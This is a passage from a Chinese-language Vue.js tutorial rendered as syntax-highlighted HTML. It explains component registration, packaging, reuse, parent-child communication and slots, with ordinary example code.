punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header-bar</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header-bar</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/my-components.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11-2-组件注册"><a href="#11-2-组件注册" class="headerlink" title="11.2 组件注册"></a>11.2 组件注册</h4><h6 id="11-2-1-自定义组件的结构"><a href="#11-2-1-自定义组件的结构" class="headerlink" title="11.2.1 自定义组件的结构"></a>11.2.1 自定义组件的结构</h6><ul><li><p><code>data</code> 定义组件的模板渲染的数据</p></li><li><p><code>template</code> 组件的HTML模块（HTML标签\css样式）</p></li><li><p><code>methods</code>  定义组件中的标签事件绑定的JS函数</p></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"header-bar"</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token function-variable function">data</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//组件中的data是通过函数返回的对象</span><span class="token keyword">return</span> <span class="token punctuation">{</span>title<span class="token operator">:</span><span class="token string">"Java2010电商平台"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div style="width: 100%; height: 80px; background: lightyellow;"&gt;&lt;table width="100%"&gt;&lt;tr&gt;&lt;td width="200" align="right" valign="middle"&gt;&lt;img src="img/logo.png" height="80"&gt;&lt;/td&gt;&lt;td&gt;&lt;label style="color: deepskyblue;font-size:32px; font-family: 华文行楷; margin-left: 30px;"&gt;{{title}}&lt;/label&gt;&lt;/td&gt;&lt;td&gt;&lt;button @click="test"&gt;组件中的按钮&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>methods<span class="token operator">:</span><span class="token punctuation">{</span><span class="token function-variable function">test</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"组件中定义的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="11-2-2-组件的封装"><a href="#11-2-2-组件的封装" class="headerlink" title="11.2.2 组件的封装"></a>11.2.2 组件的封装</h6><ul><li>将模版中的css样式提出取来，单独定义到css文件存储在css目录</li><li>将模版中的图片存在在img目录</li><li>将定义组件的js文件和vue的文件存放到js目录</li></ul><table><thead><tr><th>vue组件封装的目录结构</th></tr></thead><tbody><tr><td><img src="imgs/1618976058692.png" alt="1618976058692"></td></tr></tbody></table><h6 id="11-2-3-组件的复用"><a href="#11-2-3-组件的复用" class="headerlink" title="11.2.3 组件的复用"></a>11.2.3 组件的复用</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/my-components.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header-bar</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header-bar</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/my-components.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11-3-组件通信"><a href="#11-3-组件通信" class="headerlink" title="11.3 组件通信"></a>11.3 组件通信</h4><blockquote><p>vue实例本身就是一个组件（模板就是el指定容器 ,data就是组件数据,methods就是组件的事件函数）<br>在vue实例指定的el容器中引用的组件称为子组件 ,当前vue实例就是父组件</p></blockquote><h6 id="11-3-1-父传子"><a href="#11-3-1-父传子" class="headerlink" title="11.3.1 父传子"></a>11.3.1 父传子</h6><blockquote><p>vue实例引用组件的时候，传递数据到引用的组件中</p></blockquote><table><thead><tr><th>示意图</th></tr></thead><tbody><tr><td><img src="imgs/1618977261480.png" alt="1618977261480"></td></tr></tbody></table><h6 id="11-3-2-子传父"><a href="#11-3-2-子传父" class="headerlink" title="11.3.2 子传父"></a>11.3.2 子传父</h6><blockquote><p>通过子组件的按钮“调用”父组件的函数，通过函数传值</p></blockquote><table><thead><tr><th>调用流程示意图</th></tr></thead><tbody><tr><td><img src="imgs/1618978096426.png" alt="1618978096426"></td></tr></tbody></table><h4 id="11-4-组件插槽"><a href="#11-4-组件插槽" class="headerlink" title="11.4 组件插槽"></a>11.4 组件插槽</h4><blockquote><p>当我们自定义vue组件时，允许组件中的部分内容在调用组件时进行定义——插槽</p></blockquote><h6 id="11-4-1-插槽的使用"><a href="#11-4-1-插槽的使用" class="headerlink" title="11.4.1 插槽的使用"></a>11.4.1 插槽的使用</h6><ul><li><p>在自定义组件时通过<code>slot</code>标签在组件的模版中定义插槽</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"header-bar"</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token function-variable function">data</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//组件中的data是通过函数返回的对象</span><span class="token keyword">return</span> <span class="token punctuation">{</span>str2<span class="token operator">:</span><span class="token string">"子组件中的数据"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div class="divStyle"&gt;&lt;table class="tableStyle"&gt;&lt;tr&gt;&lt;td width="200" align="right" valign="middle"&gt;&lt;img src="img/logo.png" class="logoImg"&gt;&lt;/td&gt;&lt;td&gt;&lt;label class="titleStyle"&gt;{{title}}&lt;/label&gt;&lt;/td&gt;&lt;td&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/td&gt;&lt;td&gt;&lt;button @click="childMethod"&gt;子组件中的按钮&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>methods<span class="token operator">:</span><span class="token punctuation">{</span><span class="token function-variable function">childMethod</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">"my-event"</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在父组件中调用此组件时，指定插槽填充的模版</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/bootstrap.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/my-components.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/bootstrap.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header-bar</span> <span class="token attr-name">:title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sss<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token comment">&lt;!--组件标签包含的HTML默认为填充到插槽的模版--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header-bar</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/my-components.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>sss<span class="token operator">:</span><span class="token string">"自定义标题"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="11-4-2-具名插槽"><a href="#11-4-2-具名插槽" class="headerlink" title="11.4.2 具名插槽"></a>11.4.2 具名插槽</h6><blockquote><p>当组件中的插槽数量&gt;1时，需要给组件中的slot标签添加name属性指定插槽的名字</p></blockquote><ul><li><p>定义组件：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"page-frame"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;&lt;div id="header" style="width:100%; height:100px;background:pink"&gt;&lt;slot name="s1"&gt;&lt;/slot&gt;&lt;/div&gt;&lt;div style="width:100%; height:580px"&gt;&lt;slot name="s2"&gt;&lt;/slot&gt;&lt;/div&gt;&lt;div id="footer" style="width:100%; height:40px;background:lightgray"&gt;{{cr}}&lt;/div&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">,</span><span class="token string">"cr"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>引用组件  <code>template</code></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>page-frame</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>标题<span class="token punctuation">"</span></span> <span class="token attr-name">cr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>千锋武汉<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--定义一个模版，填充到组件的name=s1的 插槽--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>歌曲名、歌手<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doSearch<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--定义一个模版，填充到组件的name=s2的 插槽--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>table table-bordered table-condensed<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>序号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌曲ID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌曲名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌手<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>专辑<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>时长<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>page-frame</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="11-4-3-插槽作用域"><a href="#11-4-3-插槽作用域" class="headerlink" title="11.4.3 插槽作用域"></a>11.4.3 插槽作用域</h6><ul><li>定义组件时，将组件中的数据绑定到<code>slot</code>标签</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"page-frame"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;&lt;div id="header" style="width:100%; height:100px;background:pink"&gt;&lt;slot name="s1"&gt;&lt;/slot&gt;&lt;/div&gt;&lt;div style="width:100%; height:580px"&gt;&lt;slot name="s2" v-bind:musics="songs"&gt;&lt;/slot&gt;&lt;/div&gt;&lt;div id="footer" style="width:100%; height:40px;background:lightgray"&gt;{{cr}}&lt;/div&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">,</span><span class="token string">"cr"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function-variable function">data</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span>songs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token 